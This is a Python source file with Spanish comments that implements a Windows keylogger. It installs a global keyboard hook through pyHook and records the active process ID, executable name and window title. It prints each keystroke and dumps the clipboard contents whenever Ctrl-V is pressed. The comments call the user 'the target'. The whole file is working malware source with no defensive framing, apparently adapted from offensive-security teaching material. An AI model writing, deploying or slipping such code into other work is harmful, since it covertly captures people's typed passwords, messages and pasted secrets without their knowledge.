from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None


def get_current_process():
    # obtenemos un handle a la foreground window
    hwnd = user32.GetForegroundWindow()

    # encontramos el ID del proceso
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # lo guardamos
    process_id = "%d" % pid.value

    # tomamos el ejecutable
    executable = create_string_buffer(b'\x00' * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # leemos su titulo
    window_title = create_string_buffer(b'\x00' * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    # imprimimos el header si estamos en el proceso correcto
    print()
    print("[ PID: %s - %s - %s ]" % (process_id,
                                     executable.value,
                                     window_title.value)
          )
    print()

    # cerramos los handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def KeyStroke(event):
    global current_window

    # checamos si el objetivo ha cambiado de ventana
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # si presionarion una tecla estandar
    if 32 < event.Ascii < 127:
        print(chr(event.Ascii), end=' ')
    else:
        # si [Ctrl-V], obtenemos lo que hay en el portapapeles
        # agregado por Dan Frisch, 2014
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print("[PASTE] - %s" % pasted_value, end=' ')
        else:
            print("[%s]" % event.Key, end=' ')

    # pasamos la ejecucion al siguiente hook registrado
    return True


# creamos y registramos un hook manager
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

# registramos el hook y ejecutamos indefinidamente
kl.HookKeyboard()
pythoncom.PumpMessages()
